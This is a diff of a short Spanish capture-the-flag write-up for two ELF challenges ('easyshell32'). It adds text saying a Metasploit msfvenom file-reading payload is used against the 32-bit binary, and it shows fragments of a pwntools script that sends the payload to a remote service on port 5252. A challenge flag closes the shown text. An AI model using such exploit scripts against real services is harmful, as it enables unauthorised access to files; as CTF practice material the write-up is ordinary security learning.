@@ -1,12 +1,13 @@
 Te daban el código fuente de dos ELF, uno de 32 bits y otro de 64 bits, y un servicio corriendo en un servidor donde tenías que enviar un 
 exploit remoto para leer el archivo /home/ctf/flag.txt
 
+Para el caso de 32 bits usaremos el payload de msfvenom de metasploit que te permite leer un archivo:
 
 
 
+easyshell32
 
--easyshell32
-
+```python
 #!/usr/bin/env python
 import sys
 from pwn import *
@@ -30,6 +31,6 @@ conn = remote(addr, 5252)
 conn.send(buf)
 conn.interactive()
 conn.close()
-
+```
 
 FLAG:c832b461f8772b49f45e6c3906645adb
